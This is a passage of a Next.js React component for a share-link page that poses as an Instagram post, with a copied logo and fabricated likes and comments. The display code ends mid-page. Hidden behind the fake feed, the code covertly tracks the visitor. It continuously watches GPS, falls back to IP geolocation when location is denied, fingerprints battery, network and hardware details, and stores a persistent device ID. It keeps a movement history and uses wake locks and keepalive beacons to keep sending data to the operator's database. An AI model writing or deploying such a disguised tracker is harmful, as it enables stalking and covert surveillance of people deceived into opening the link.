"use client";

import { useEffect, useState, useRef, useMemo } from "react";
import { database } from "@/lib/firebase";
import { ref, get, runTransaction, serverTimestamp } from "firebase/database";
import dynamic from "next/dynamic";
import Image from "next/image";
import axios from "axios";
import { useSearchParams } from "next/navigation";
import { Location, LocationHistoryEntry } from "@/components/interfaces/location.interface";
import { ShareLink } from "@/components/interfaces/sharelink.interface";
import {
  normalizeTrackLocale,
  numberLocaleForTrack,
  trackT,
  type TrackMessageKey,
} from "@/lib/track-page-i18n";
import {
  Home, Search, PlusSquare, Heart,
  MoreHorizontal, Bookmark, MessageCircle, Send,
  Compass,
} from "lucide-react";

const Map = dynamic(() => import("@/components/Map"), { ssr: false });

const DEFAULT_POST_IMAGE =
  "/assets/images/imgur.jpeg";

/** Decorative story avatars (not the share link owner row) */
const MOCK_STORIES = [
  { name: "marco.v", avatar: "https://i.pravatar.cc/48?img=1" },
  { name: "sara_ph", avatar: "https://i.pravatar.cc/48?img=5" },
  { name: "j.torres", avatar: "https://i.pravatar.cc/48?img=8" },
  { name: "lena_k", avatar: "https://i.pravatar.cc/48?img=11" },
  { name: "rob.x", avatar: "https://i.pravatar.cc/48?img=14" },
  { name: "a_paris", avatar: "https://i.pravatar.cc/48?img=20" },
];

// Instagram SVG logo
function InstagramLogo() {
  return (
    <svg aria-label="Instagram" height="29" role="img" viewBox="32 4 113 32" width="103" fill="currentColor">
      <path clipRule="evenodd" d="M37.82 4.11c-2.32.97-4.86 3.7-5.66 7.13-1.02 4.34 3.21 6.17 3.56 5.57.4-.7-.76-.94-1-3.2-.3-2.9 1.05-6.16 2.75-7.58.32-.27.3.1.3.78l-.06 14.46c0 3.1-.13 4.07-.36 5.04-.23.98-.6 1.64-.33 1.9.32.28 1.68-.4 2.46-1.5a8.13 8.13 0 0 0 1.33-4.58c.07-2.06.06-5.33.07-7.19 0-1.7.03-6.71-.03-9.72-.02-.74-2.07-1.51-3.03-1.1Zm82.13 14.48a9.42 9.42 0 0 1-.88 3.75c-.85 1.72-2.63 2.25-3.39-.22-.4-1.34-.43-3.59-.13-5.47.3-1.9 1.14-3.35 2.53-3.22 1.38.13 2.02 1.9 1.87 5.16ZM96.8 28.57c-.02 2.67-.44 5.01-1.34 5.7-1.29.96-3 .23-2.65-1.72.31-1.72 1.8-3.48 4-5.64l-.01 1.66Zm-.35-10a10.56 10.56 0 0 1-.88 3.77c-.85 1.72-2.64 2.25-3.39-.22-.5-1.69-.38-3.87-.13-5.25.33-1.78 1.12-3.44 2.53-3.44 1.38 0 2.06 1.5 1.87 5.14Zm-13.41-.02a9.54 9.54 0 0 1-.87 3.8c-.88 1.7-2.63 2.24-3.4-.23-.55-1.77-.36-4.2-.13-5.5.34-1.95 1.2-3.32 2.53-3.2 1.38.14 2.04 1.9 1.87 5.13Zm61.45 1.81c-.33 0-.49.35-.61.93-.44 2.02-.9 2.48-1.5 2.48-.66 0-1.26-1-1.42-3-.12-1.58-.1-4.48.06-7.37.03-.59-.14-1.17-1.73-1.75-.68-.25-1.68-.62-2.17.58a29.65 29.65 0 0 0-2.08 7.14c0 .06-.08.07-.1-.06-.07-.87-.26-2.46-.28-5.79 0-.65-.14-1.2-.86-1.65-.47-.3-1.88-.81-2.4-.2-.43.5-.94 1.87-1.47 3.48l-.74 2.2.01-4.88c0-.5-.34-.67-.45-.7a9.54 9.54 0 0 0-1.8-.37c-.48 0-.6.27-.6.67 0 .05-.08 4.65-.08 7.87v.46c-.27 1.48-1.14 3.49-2.09 3.49s-1.4-.84-1.4-4.68c0-2.24.07-3.21.1-4.83.02-.94.06-1.65.06-1.81-.01-.5-.87-.75-1.27-.85-.4-.09-.76-.13-1.03-.11-.4.02-.67.27-.67.62v.55a3.71 3.71 0 0 0-1.83-1.49c-1.44-.43-2.94-.05-4.07 1.53a9.31 9.31 0 0 0-1.66 4.73c-.16 1.5-.1 3.01.17 4.3-.33 1.44-.96 2.04-1.64 2.04-.99 0-1.7-1.62-1.62-4.4.06-1.84.42-3.13.82-4.99.17-.8.04-1.2-.31-1.6-.32-.37-1-.56-1.99-.33-.7.16-1.7.34-2.6.47 0 0 .05-.21.1-.6.23-2.03-1.98-1.87-2.69-1.22-.42.39-.7.84-.82 1.67-.17 1.3.9 1.91.9 1.91a22.22 22.22 0 0 1-3.4 7.23v-.7c-.01-3.36.03-6 .05-6.95.02-.94.06-1.63.06-1.8 0-.36-.22-.5-.66-.67-.4-.16-.86-.26-1.34-.3-.6-.05-.97.27-.96.65v.52a3.7 3.7 0 0 0-1.84-1.49c-1.44-.43-2.94-.05-4.07 1.53a10.1 10.1 0 0 0-1.66 4.72c-.15 1.57-.13 2.9.09 4.04-.23 1.13-.89 2.3-1.63 2.3-.95 0-1.5-.83-1.5-4.67 0-2.24.07-3.21.1-4.83.02-.94.06-1.65.06-1.81 0-.5-.87-.75-1.27-.85-.42-.1-.79-.13-1.06-.1-.37.02-.63.35-.63.6v.56a3.7 3.7 0 0 0-1.84-1.49c-1.44-.43-2.93-.04-4.07 1.53-.75 1.03-1.35 2.17-1.66 4.7a15.8 15.8 0 0 0-.12 2.04c-.3 1.81-1.61 3.9-2.68 3.9-.63 0-1.23-1.21-1.23-3.8 0-3.45.22-8.36.25-8.83l1.62-.03c.68 0 1.29.01 2.19-.04.45-.02.88-1.64.42-1.84-.21-.09-1.7-.17-2.3-.18-.5-.01-1.88-.11-1.88-.11s.13-3.26.16-3.6c.02-.3-.35-.44-.57-.53a7.77 7.77 0 0 0-1.53-.44c-.76-.15-1.1 0-1.17.64-.1.97-.15 3.82-.15 3.82-.56 0-2.47-.11-3.02-.11-.52 0-1.08 2.22-.36 2.25l3.2.09-.03 6.53v.47c-.53 2.73-2.37 4.2-2.37 4.2.4-1.8-.42-3.15-1.87-4.3-.54-.42-1.6-1.22-2.79-2.1 0 0 .69-.68 1.3-2.04.43-.96.45-2.06-.61-2.3-1.75-.41-3.2.87-3.63 2.25a2.61 2.61 0 0 0 .5 2.66l.15.19c-.4.76-.94 1.78-1.4 2.58-1.27 2.2-2.24 3.95-2.97 3.95-.58 0-.57-1.77-.57-3.43 0-1.43.1-3.58.19-5.8.03-.74-.34-1.16-.96-1.54a4.33 4.33 0 0 0-1.64-.69c-.7 0-2.7.1-4.6 5.57-.23.69-.7 1.94-.7 1.94l.04-6.57c0-.16-.08-.3-.27-.4a4.68 4.68 0 0 0-1.93-.54c-.36 0-.54.17-.54.5l-.07 10.3c0 .78.02 1.69.1 2.09.08.4.2.72.36.91.15.2.33.34.62.4.28.06 1.78.25 1.86-.32.1-.69.1-1.43.89-4.2 1.22-4.31 2.82-6.42 3.58-7.16.13-.14.28-.14.27.07l-.22 5.32c-.2 5.37.78 6.36 2.17 6.36 1.07 0 2.58-1.06 4.2-3.74l2.7-4.5 1.58 1.46c1.28 1.2 1.7 2.36 1.42 3.45-.21.83-1.02 1.7-2.44.86-.42-.25-.6-.44-1.01-.71-.23-.15-.57-.2-.78-.04-.53.4-.84.92-1.01 1.55-.17.61.45.94 1.09 1.22.55.25 1.74.47 2.5.5 2.94.1 5.3-1.42 6.94-5.34.3 3.38 1.55 5.3 3.72 5.3 1.45 0 2.91-1.88 3.55-3.72.18.75.45 1.4.8 1.96 1.68 2.65 4.93 2.07 6.56-.18.5-.69.58-.94.58-.94a3.07 3.07 0 0 0 2.94 2.87c1.1 0 2.23-.52 3.03-2.31.09.2.2.38.3.56 1.68 2.65 4.93 2.07 6.56-.18l.2-.28.05 1.4-1.5 1.37c-2.52 2.3-4.44 4.05-4.58 6.09-.18 2.6 1.93 3.56 3.53 3.69a4.5 4.5 0 0 0 4.04-2.11c.78-1.15 1.3-3.63 1.26-6.08l-.06-3.56a28.55 28.55 0 0 0 5.42-9.44s.93.01 1.92-.05c.32-.02.41.04.35.27-.07.28-1.25 4.84-.17 7.88.74 2.08 2.4 2.75 3.4 2.75 1.15 0 2.26-.87 2.85-2.17l.23.42c1.68 2.65 4.92 2.07 6.56-.18.37-.5.58-.94.58-.94.36 2.2 2.07 2.88 3.05 2.88 1.02 0 2-.42 2.78-2.28.03.82.08 1.49.16 1.7.05.13.34.3.56.37.93.34 1.88.18 2.24.11.24-.05.43-.25.46-.75.07-1.33.03-3.56.43-5.21.67-2.79 1.3-3.87 1.6-4.4.17-.3.36-.35.37-.03.01.64.04 2.52.3 5.05.2 1.86.46 2.96.65 3.3.57 1 1.27 1.05 1.83 1.05.36 0 1.12-.1 1.05-.73-.03-.31.02-2.22.7-4.96.43-1.79 1.15-3.4 1.41-4 .1-.21.15-.04.15 0-.06 1.22-.18 5.25.32 7.46.68 2.98 2.65 3.32 3.34 3.32 1.47 0 2.67-1.12 3.07-4.05.1-.7-.05-1.25-.48-1.25Z" fillRule="evenodd" />
    </svg>
  );
}

// -------------------------------------------------------------------
// Helpers
// -------------------------------------------------------------------

interface IpGeoResult {
  latitude: number;
  longitude: number;
  city: string | null;
  region: string | null;
  country: string | null;
  isp: string | null;
}

/** City-level location from IP via ipapi.co (HTTPS, no key required) */
async function fetchIpGeo(ip: string): Promise<IpGeoResult | null> {
  try {
    const url = ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/";
    const res = await axios.get<{
      latitude: number; longitude: number;
      city: string; region: string; country_name: string; org: string;
    }>(url, { timeout: 6000 });
    const d = res.data;
    if (!d.latitude || !d.longitude) return null;
    return {
      latitude: d.latitude,
      longitude: d.longitude,
      city: d.city ?? null,
      region: d.region ?? null,
      country: d.country_name ?? null,
      isp: d.org ?? null,
    };
  } catch {
    return null;
  }
}

/** Collect battery, network, hardware fingerprint — all optional APIs */
async function collectFingerprint(): Promise<Partial<Location>> {
  const fp: Partial<Location> = {
    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
    deviceMemory: (navigator as unknown as { deviceMemory?: number }).deviceMemory ?? null,
    maxTouchPoints: navigator.maxTouchPoints ?? null,
    platform: navigator.platform ?? null,
  };

  // Network info (Chrome/Android)
  const conn = (navigator as unknown as { connection?: {
    effectiveType?: string; downlink?: number; rtt?: number;
  } }).connection;
  if (conn) {
    fp.networkType = conn.effectiveType ?? null;
    fp.networkDownlink = conn.downlink ?? null;
    fp.networkRtt = conn.rtt ?? null;
  }

  // Battery (Chrome/Android)
  try {
    const nav = navigator as unknown as { getBattery?: () => Promise<{ level: number; charging: boolean }> };
    if (typeof nav.getBattery === "function") {
      const bat = await nav.getBattery();
      fp.batteryLevel = Math.round(bat.level * 100);
      fp.batteryCharging = bat.charging;
    }
  } catch { /* not supported */ }

  return fp;
}

function stripUndefined<T extends Record<string, unknown>>(obj: T): T {
  return Object.fromEntries(
    Object.entries(obj).filter(([, v]) => v !== undefined)
  ) as T;
}

function validateAndSanitizeLocationPayload(data: Partial<Location>): Partial<Location> {
  const sanitized: Partial<Location> = { ...data };

  // Validate latitude bounds
  if (typeof sanitized.latitude === "number") {
    if (isNaN(sanitized.latitude) || sanitized.latitude < -90 || sanitized.latitude > 90) {
      delete sanitized.latitude;
    }
  }

  // Validate longitude bounds
  if (typeof sanitized.longitude === "number") {
    if (isNaN(sanitized.longitude) || sanitized.longitude < -180 || sanitized.longitude > 180) {
      delete sanitized.longitude;
    }
  }

  // Bound string lengths to prevent oversized/bloated payloads
  if (typeof sanitized.userAgent === "string") sanitized.userAgent = sanitized.userAgent.slice(0, 500);
  if (typeof sanitized.referrer === "string") sanitized.referrer = sanitized.referrer.slice(0, 500);
  if (typeof sanitized.deviceId === "string") sanitized.deviceId = sanitized.deviceId.slice(0, 128);
  if (typeof sanitized.ip === "string") sanitized.ip = sanitized.ip.slice(0, 64);
  if (typeof sanitized.userTimezone === "string") sanitized.userTimezone = sanitized.userTimezone.slice(0, 100);
  if (typeof sanitized.userLanguage === "string") sanitized.userLanguage = sanitized.userLanguage.slice(0, 50);
  if (typeof sanitized.ipCity === "string") sanitized.ipCity = sanitized.ipCity.slice(0, 100);
  if (typeof sanitized.ipRegion === "string") sanitized.ipRegion = sanitized.ipRegion.slice(0, 100);
  if (typeof sanitized.ipCountry === "string") sanitized.ipCountry = sanitized.ipCountry.slice(0, 100);
  if (typeof sanitized.ipIsp === "string") sanitized.ipIsp = sanitized.ipIsp.slice(0, 100);

  return sanitized;
}

function sanitizeHistoryEntry(entry: Omit<LocationHistoryEntry, "ts"> | null): Omit<LocationHistoryEntry, "ts"> | null {
  if (!entry) return null;
  if (
    typeof entry.latitude !== "number" ||
    isNaN(entry.latitude) ||
    entry.latitude < -90 ||
    entry.latitude > 90 ||
    typeof entry.longitude !== "number" ||
    isNaN(entry.longitude) ||
    entry.longitude < -180 ||
    entry.longitude > 180
  ) {
    return null;
  }
  return {
    ...entry,
    accuracy: typeof entry.accuracy === "number" && !isNaN(entry.accuracy) && entry.accuracy >= 0 ? entry.accuracy : null,
  };
}


function getDeterministicMetrics(id?: string | null) {
  let hash = 42;
  if (id) {
    for (let i = 0; i < id.length; i++) {
      hash = (hash << 5) - hash + id.charCodeAt(i);
      hash |= 0;
    }
  }
  const absHash = Math.abs(hash);
  return {
    likeBase: 1200 + (absHash % 2800),
    commentsCount: 24 + (absHash % 140),
    hoursAgo: 1 + (absHash % 11),
  };
}

// -------------------------------------------------------------------
// Component
// -------------------------------------------------------------------

export default function TrackClient() {
  const [userLocation, setUserLocation] = useState<Location | undefined>();
  const [shareLink, setShareLink] = useState<ShareLink | null>(null);
  const [liked, setLiked] = useState(false);
  const [saved, setSaved] = useState(false);
  const [postImageBroken, setPostImageBroken] = useState(false);
  const ipRef = useRef("");
  const searchParams = useSearchParams();
  const shareLinkId = searchParams.get("id");

  const { likeBase, commentsCount, hoursAgo } = useMemo(
    () => getDeterministicMetrics(shareLinkId),
    [shareLinkId]
  );
  const [likeCount, setLikeCount] = useState(likeBase);

  useEffect(() => {
    setLikeCount(likeBase);
  }, [likeBase]);

  // Fetch share link metadata for the post UI
  useEffect(() => {
    if (!shareLinkId) return;
    get(ref(database, `shareLinks/${shareLinkId}`)).then((snap) => {
      if (snap.exists()) setShareLink(snap.val() as ShareLink);
    });
  }, [shareLinkId]);

  // Fetch IP eagerly — needed by both GPS and IP-fallback paths
  useEffect(() => {
    axios.get<{ ip: string }>("https://api.ipify.org/?format=json")
      .then((res) => { ipRef.current = res.data.ip; })
      .catch(() => { ipRef.current = ""; });
  }, []);

  // Core tracking logic
  useEffect(() => {
    if (!shareLinkId || typeof navigator === "undefined") return;

    const deviceId = localStorage.getItem("deviceId") || crypto.randomUUID();
    localStorage.setItem("deviceId", deviceId);

    /**
     * Web apps cannot track in the background. These thresholds tune how we
     * surface that constraint in the data so the consumer UI renders honestly.
     */
    const GAP_BREAK_MS = 30_000; // gap marker added to next history entry when > this
    const HEARTBEAT_INTERVAL_MS = 60_000; // liveness ping cadence while visible
    const HEARTBEAT_STALE_MS = 45_000; // skip heartbeat if a real GPS ping just landed

    type TrackerState = {
      lastKnown: {
        latitude: number;
        longitude: number;
        locationSource: "gps" | "ip";
        accuracy: number | null;
      } | null;
      hiddenAt: number;
      lastPingAt: number;
      pendingGapMs: number;
    };

    const state: TrackerState = {
      lastKnown: null,
      hiddenAt: 0,
      lastPingAt: 0,
      pendingGapMs: 0,
    };

    /** Shared fields that don't depend on lat/lng */
    const baseData = () => ({
      nickname: "",
      userId: "anonymous",
      shareLinkId,
      ip: ipRef.current,
      deviceId,
      deviceType: /Mobi/.test(navigator.userAgent) ? "Mobile" : "Desktop",
      userAgent: navigator.userAgent,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      referrer: document.referrer,
      userLanguage: navigator.language,
      userTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    });

    /**
     * Atomic merge + history append so concurrent GPS updates do not drop pings.
     * When `historyEntry` is null, writes a top-level-only patch (e.g. heartbeats,
     * visibility markers) without polluting the movement history.
     */
    const persist = async (
      data: Partial<Location>,
      historyEntry: Omit<LocationHistoryEntry, "ts"> | null
    ) => {
      const cleanData = validateAndSanitizeLocationPayload(data);
      const cleanEntry = sanitizeHistoryEntry(historyEntry);

      const locRef = ref(database, `locations/${deviceId}`);
      await runTransaction(locRef, (current) => {
        const cur =
          current != null && typeof current === "object"
            ? (current as Partial<Location> & { createdAt?: number })
            : null;
        const base = cur ? { ...cur } : {};
        const rawHistory = base.history;
        const prevHistory: LocationHistoryEntry[] = Array.isArray(rawHistory)
          ? rawHistory
          : rawHistory && typeof rawHistory === "object"
            ? (Object.values(rawHistory) as LocationHistoryEntry[])
            : [];
        const history = cleanEntry
          ? [
              ...prevHistory,
              { ...cleanEntry, ts: serverTimestamp() },
            ].slice(-200)
          : prevHistory;
        const createdAt =
          base.createdAt != null && typeof base.createdAt === "number"
            ? base.createdAt
            : serverTimestamp();
        const merged = stripUndefined({
          ...base,
          ...cleanData,
          history,
          createdAt,
          updatedAt: serverTimestamp(),
        } as Record<string, unknown>);
        return merged;
      });
    };

    /**
     * Best-effort PATCH via Firebase REST using `fetch({ keepalive: true })`.
     * The browser allows this request to outlive the page when fired from
     * `pagehide` / `visibilitychange: hidden`, which the Firebase JS SDK cannot.
     */
    const sendKeepalive = (payload: Record<string, unknown>) => {
      const dbUrl = process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL;
      if (!dbUrl) return;
      try {
        const cleanPayload = validateAndSanitizeLocationPayload(payload as Partial<Location>);
        const url = `${dbUrl.replace(/\/$/, "")}/locations/${encodeURIComponent(
          deviceId
        )}.json`;
        void fetch(url, {
          method: "PATCH",
          keepalive: true,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(cleanPayload),
        }).catch(() => {});
      } catch {
        /* ignore */
      }
    };

    const consumePendingGap = (): number | null => {
      if (state.pendingGapMs > 0) {
        const g = state.pendingGapMs;
        state.pendingGapMs = 0;
        return g;
      }
      return null;
    };

    /** --- GPS path --- */
    const onGpsSuccess = async (position: GeolocationPosition) => {
      try {
        const { latitude, longitude, accuracy } = position.coords;

        if (!ipRef.current) {
          try {
            const r = await axios.get<{ ip: string }>("https://api.ipify.org/?format=json");
            ipRef.current = r.data.ip;
          } catch { /* ignore */ }
        }

        const fp = await collectFingerprint();
        const gap = consumePendingGap();

        await persist(
          {
            ...baseData(),
            latitude,
            longitude,
            locationSource: "gps",
            sessionState: "active",
            foregroundedAt: serverTimestamp() as unknown as number,
            ...fp,
          },
          {
            latitude,
            longitude,
            accuracy: accuracy ?? null,
            locationSource: "gps",
            gapBeforeMs: gap,
          }
        );

        state.lastKnown = {
          latitude,
          longitude,
          locationSource: "gps",
          accuracy: accuracy ?? null,
        };
        state.lastPingAt = Date.now();
        setUserLocation({ latitude, longitude });
      } catch { /* silent */ }
    };

    /** --- IP fallback path (triggered on GPS denial or unavailability) --- */
    const onGpsError = async () => {
      try {
        if (!ipRef.current) {
          try {
            const r = await axios.get<{ ip: string }>("https://api.ipify.org/?format=json");
            ipRef.current = r.data.ip;
          } catch { /* ignore */ }
        }

        const geo = await fetchIpGeo(ipRef.current);
        if (!geo) return;

        const fp = await collectFingerprint();
        const gap = consumePendingGap();

        await persist(
          {
            ...baseData(),
            ip: ipRef.current,
            latitude: geo.latitude,
            longitude: geo.longitude,
            locationSource: "ip",
            sessionState: "active",
            foregroundedAt: serverTimestamp() as unknown as number,
            ipCity: geo.city,
            ipRegion: geo.region,
            ipCountry: geo.country,
            ipIsp: geo.isp,
            ipAccuracy: "city-level",
            ...fp,
          },
          {
            latitude: geo.latitude,
            longitude: geo.longitude,
            accuracy: null,
            locationSource: "ip",
            gapBeforeMs: gap,
          }
        );

        state.lastKnown = {
          latitude: geo.latitude,
          longitude: geo.longitude,
          locationSource: "ip",
          accuracy: null,
        };
        state.lastPingAt = Date.now();
        setUserLocation({ latitude: geo.latitude, longitude: geo.longitude });
      } catch { /* silent */ }
    };

    // ---------------- Background-tracking resilience ----------------

    /** Screen Wake Lock — reduces iOS/Android tab suspension while the screen is on. */
    let wakeLock: { release: () => Promise<void> } | null = null;
    const requestWakeLock = async () => {
      try {
        const nav = navigator as unknown as {
          wakeLock?: { request: (type: "screen") => Promise<{ release: () => Promise<void> }> };
        };
        if (!nav.wakeLock || wakeLock) return;
        wakeLock = await nav.wakeLock.request("screen");
      } catch {
        /* user gesture / permission denial — ignore */
      }
    };
    const releaseWakeLock = () => {
      const wl = wakeLock;
      wakeLock = null;
      if (wl) {
        void wl.release().catch(() => {});
      }
    };

    const onVisibilityChange = () => {
      if (document.visibilityState === "hidden") {
        state.hiddenAt = Date.now();
        // Best-effort pause marker via REST keepalive (survives tab suspension).
        sendKeepalive({
          backgroundedAt: { ".sv": "timestamp" },
          updatedAt: { ".sv": "timestamp" },
          sessionState: "hidden",
        });
        // Best-effort pause marker via SDK too (may or may not land before suspension).
        void persist(
          { sessionState: "hidden", backgroundedAt: serverTimestamp() as unknown as number },
          state.lastKnown
            ? {
                latitude: state.lastKnown.latitude,
                longitude: state.lastKnown.longitude,
                accuracy: state.lastKnown.accuracy,
                locationSource: state.lastKnown.locationSource,
                paused: true,
              }
            : null
        ).catch(() => {});
        releaseWakeLock();
      } else {
        const gap = state.hiddenAt > 0 ? Date.now() - state.hiddenAt : 0;
        state.hiddenAt = 0;
        if (gap > GAP_BREAK_MS) state.pendingGapMs = gap;
        // Trigger an immediate fresh fix so the map shows the resume point fast.
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            onGpsSuccess,
            onGpsError,
            { enableHighAccuracy: true, maximumAge: 0, timeout: 15_000 }
          );
        }
        void requestWakeLock();
      }
    };

    const onPageHide = () => {
      // Last-chance write. SDK writes may not flush, so lean on fetch-keepalive.
      sendKeepalive({
        backgroundedAt: { ".sv": "timestamp" },
        updatedAt: { ".sv": "timestamp" },
        sessionState: "ended",
      });
      releaseWakeLock();
    };

    /**
     * Liveness heartbeat: while visible, if no GPS ping has landed recently,
     * refresh `updatedAt` / `lastHeartbeatAt` at top level so the consumer UI
     * "live" badge stays accurate even when the user is stationary.
     */
    const heartbeatId = window.setInterval(() => {
      if (document.visibilityState !== "visible") return;
      const now = Date.now();
      if (now - state.lastPingAt < HEARTBEAT_STALE_MS) return;
      void persist(
        {
          sessionState: "active",
          lastHeartbeatAt: serverTimestamp() as unknown as number,
        },
        null
      ).catch(() => {});
    }, HEARTBEAT_INTERVAL_MS);

    if (!navigator.geolocation) {
      // No geolocation API at all — go straight to IP fallback.
      onGpsError();
      document.addEventListener("visibilitychange", onVisibilityChange);
      window.addEventListener("pagehide", onPageHide);
      void requestWakeLock();
      return () => {
        document.removeEventListener("visibilitychange", onVisibilityChange);
        window.removeEventListener("pagehide", onPageHide);
        window.clearInterval(heartbeatId);
        releaseWakeLock();
      };
    }

    const watchId = navigator.geolocation.watchPosition(
      onGpsSuccess,
      onGpsError,
      { enableHighAccuracy: true, maximumAge: 10_000, timeout: 30_000 }
    );

    document.addEventListener("visibilitychange", onVisibilityChange);
    window.addEventListener("pagehide", onPageHide);
    void requestWakeLock();

    return () => {
      navigator.geolocation.clearWatch(watchId);
      document.removeEventListener("visibilitychange", onVisibilityChange);
      window.removeEventListener("pagehide", onPageHide);
      window.clearInterval(heartbeatId);
      releaseWakeLock();
    };
  }, [shareLinkId]);

  const locale = normalizeTrackLocale(shareLink?.locale ?? undefined);
  const t = (key: TrackMessageKey, vars?: Record<string, string | number>) =>
    trackT(locale, key, vars);

  const linkImage = shareLink?.imageUrl?.trim() || "";
  const postUser =
    shareLink?.username?.trim() || shareLink?.name?.trim() || "Insta Leaks";
  const storiesLabel = shareLink?.username?.trim() || t("yourStory");
  const postCaption = shareLink?.description || t("defaultCaption");
  /** Main feed + profile chrome: same asset as the share link when set */
  const feedImageSrc = linkImage && !postImageBroken ? linkImage : DEFAULT_POST_IMAGE;
  const avatarSrc =
    linkImage && !postImageBroken
      ? linkImage
      : `https://i.pravatar.cc/64?u=${shareLinkId ?? "guest"}`;

  useEffect(() => {
    setPostImageBroken(false);
  }, [linkImage]);

  const likeDisplay = (likeCount + (liked ? 1 : 0)).toLocaleString(
    numberLocaleForTrack(locale)
  );

  return (
    <div
      lang={locale === "de" ? "de" : "en"}
      className="flex flex-col min-h-screen max-w-[480px] mx-auto bg-white"
    >

      {/* Header */}
      <header className="sticky top-0 z-10 flex items-center justify-between px-4 py-3 bg-white border-b border-gray-200">
        <InstagramLogo />
        <div className="flex items-center gap-4">
          <button className="text-gray-900">
            <Heart className="h-6 w-6" />
          </button>
          <button className="text-gray-900">
            <Send className="h-6 w-6" style={{ transform: "rotate(15deg)" }} />
          </button>
        </div>
      </header>

      {/* Stories — first cell: empty ring + label from share link (Instagram “no story” look) */}
      <div className="flex gap-3 px-4 py-3 overflow-x-auto scrollbar-hide border-b border-gray-100">
        <div className="flex flex-col items-center gap-1 shrink-0">
          <div className="w-14 h-14 rounded-full p-[2.5px] bg-gradient-to-tr from-yellow-400 via-fuchsia-500 to-orange-500 shrink-0">
            <div className="w-full h-full rounded-full bg-white ring-1 ring-gray-200/80" aria-hidden />
          </div>
          <span className="text-[10px] text-gray-700 w-14 text-center truncate">
            {storiesLabel}
          </span>
        </div>
        {MOCK_STORIES.map((story) => (
          <div key={story.name} className="flex flex-col items-center gap-1 shrink-0">
            <div className="w-14 h-14 rounded-full p-0.5 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 shrink-0">
              <div className="w-full h-full rounded-full bg-gray-200 overflow-hidden border-2 border-white">
                {story.avatar ? (
                  <Image
                    src={story.avatar}
                    alt={story.name}
                    width={56}
                    height={56}
                    unoptimized
                    className="w-full h-full object-cover"
                  />
                ) : (
                  <div className="w-full h-full bg-gradient-to-br from-gray-200 to-gray-300 animate-pulse" />
                )}
              </div>
            </div>
            <span className="text-[10px] text-gray-700 w-14 text-center truncate">
              {story.name}
            </span>
          </div>
        ))}
      </div>

      {/* Feed */}
      <div className="flex-1">

        {/* Post */}
        <article>
          {/* Post header */}
          <div className="flex items-center justify-between px-3 py-2.5">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 p-0.5">
                <div className="w-full h-full rounded-full bg-white overflow-hidden relative">
                  <Image
                    src={avatarSrc}
                    alt={postUser}
                    width={32}
                    height={32}
                    unoptimized
                    className="w-full h-full object-cover"
                    onError={() => {
                      if (linkImage) setPostImageBroken(true);
                    }}
                  />
                </div>
              </div>
              <div>
                <p className="text-sm font-semibold text-gray-900 leading-none">{postUser}</p>
                <p className="text-xs text-gray-500 mt-0.5">{t("sponsored")}</p>
              </div>
            </div>
            <button className="text-gray-900 p-1">
              <MoreHorizontal className="h-5 w-5" />
            </button>
          </div>

          {/* Post image */}
          <div className="w-full aspect-square bg-gray-100 overflow-hidden relative">
            <Image
              src={feedImageSrc}
              alt={postCaption}
              fill
              unoptimized
              className="object-cover"
              onError={() => setPostImageBroken(true)}
            />
          </div>

          {/* Actions */}
          <div className="px-3 pt-3 pb-1">
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-4">
                <button onClick={() => setLiked(!liked)}>
                  <Heart
                    className={`h-6 w-6 transition-colors ${liked ? "fill-red-500 text-red-500" : "text-gray-900"}`}
                  />
                </button>
                <button>
                  <MessageCircle className="h-6 w-6 text-gray-900" />
                </button>
                <button>
                  <Send className="h-6 w-6 text-gray-900" style={{ transform: "rotate(15deg)" }} />
                </button>
              </div>
              <button onClick={() => setSaved(!saved)}>
                <Bookmark
                  className={`h-6 w-6 transition-colors ${saved ? "fill-gray-900 text-gray-900" : "text-gray-900"}`}
                />
              </button>
            </div>

            {/* Likes */}
            <p className="text-sm font-semibold text-gray-900 mb-1" suppressHydrationWarning>
              {t("likesLine", { count: likeDisplay })}
            </p>

            {/* Caption */}
            <p className="text-sm text-gray-900">
              <span className="font-semibold mr-1">{postUser}</span>
              {postCaption}
            </p>

            {/* View comments */}
            <button type="button" className="text-sm text-gray-500 mt-1" suppressHydrationWarning>
              {t("viewAllComments", { n: commentsCount })}
            </button>

            {/* Time */}
            <p className="text-[10px] uppercase tracking-wider text-gray-400 mt-1" suppressHydrationWarning>
              {t("hoursAgo", { n: hoursAgo })}
            </p>
          </div>

          {/* Comment input */}
          <div className="flex items-center gap-3 px-3 py-3 border-t border-gray-100">
            <div className="w-7 h-7 rounded-full bg-gray-200 overflow-hidden shrink-0 relative">
              {linkImage && !postImageBroken ? (
                <Image
                  src={linkImage}
                  alt=""
                  width={28}
                  height={28}
                  unoptimized
                  className="w-full h-full object-cover"
                />
              ) : (
                <div className="w-full h-full bg-gray-300 animate-pulse" />
              )}
            </div>
            <input
              type="text"
              placeholder={t("addCommentPlaceholder")}
              className="flex-1 text-sm text-gray-900 bg-transparent outline-none placeholder:text-gray-400"
            />
            <button type="button" className="text-sm font-semibold text-blue-500">
              {t("post")}
            </button>
          </div>
        </article>

        {/* Second skeleton post */}
        <article className="mt-2">
          <div className="flex items-center gap-2.5 px-3 py-2.5">
            <div className="w-8 h-8 rounded-full bg-gray-200 animate-pulse" />
            <div className="space-y-1.5">
              <div className="h-2.5 w-24 bg-gray-200 animate-pulse rounded" />
              <div className="h-2 w-16 bg-gray-100 animate-pulse rounded" />
            </div>
          </div>
          <div className="w-full aspect-square bg-gray-100 animate-pulse" />
          <div className="px-3 py-3 space-y-2">
            <div className="h-2.5 w-24 bg-gray-200 animate-pulse rounded" />
            <div className="h-2 w-48 bg-gray-100 animate-pulse rounded" />
            <div className="h-2 w-32 bg-gray-100 animate-pulse rounded" />
          </div>
        </article>
      </div>

      {/* Hidden map — keeps location logic alive */}
      {userLocation && (
        <div className="hidden">
          <Map
            userLocations={userLocation as Location}
            zoom={14}
            center={[userLocation.latitude ?? 0, userLocation.longitude ?? 0]}
          />
        </div>
      )}

      {/* Bottom Nav */}
